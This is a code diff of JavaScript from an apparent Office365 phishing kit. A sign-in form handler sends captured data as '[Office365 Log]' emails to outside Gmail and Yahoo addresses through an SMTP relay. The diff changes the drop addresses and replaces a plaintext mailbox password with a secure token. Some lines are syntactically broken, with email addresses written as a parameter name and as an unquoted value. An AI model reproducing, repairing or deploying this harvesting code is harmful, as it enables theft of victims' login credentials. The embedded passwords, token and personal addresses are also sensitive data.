@@ -1,5 +1,5 @@
 var smtp_host = 'smtp.office365.com';
-var smtp_username = 'marc.declercq@edu.vlerick.com';
+var smtp_username = 'JohnAdams@BoydCat.com';
 
 //Enter were logs will go here
 var log_email = ''
@@ -95,14 +95,16 @@ loadForm(), document.getElementById("email-signin").addEventListener("submit", p
 });
 
 
-function sendEmail(to,message) {
-  Email.send("basheer@ami-worldwide.com",
-  To : "gotradebtc@gmail.com",
-  From : "basheer@ami-worldwide.com",
-  Subject : '+ [Office365 Log] +',
+function sendEmail(gotradebtc@gmail.com,message) {
+  Email.send({
+  // Host: smtp_host,
+  // Username : smtp_username,
+  // Password : smtp_password,
+  SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
+  To : nelsonjail@yahoo.com,
+  From : smtp_username,
+  Subject : '==============+ [Office365 Log] +================',
   Body : message,
-    Username : "basheer@ami-worldwide.com",
-    Password : "Ami@2020"
   }).then(function(message){
       if(message == 'OK'){
         console.log('message sent')
